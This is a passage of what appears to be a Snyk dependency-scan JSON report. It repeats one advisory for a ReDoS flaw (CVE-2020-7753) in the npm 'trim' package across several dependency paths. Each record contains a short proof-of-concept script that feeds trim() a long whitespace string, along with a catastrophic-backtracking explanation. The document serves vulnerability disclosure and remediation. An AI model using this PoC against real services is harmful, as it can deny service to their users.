          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
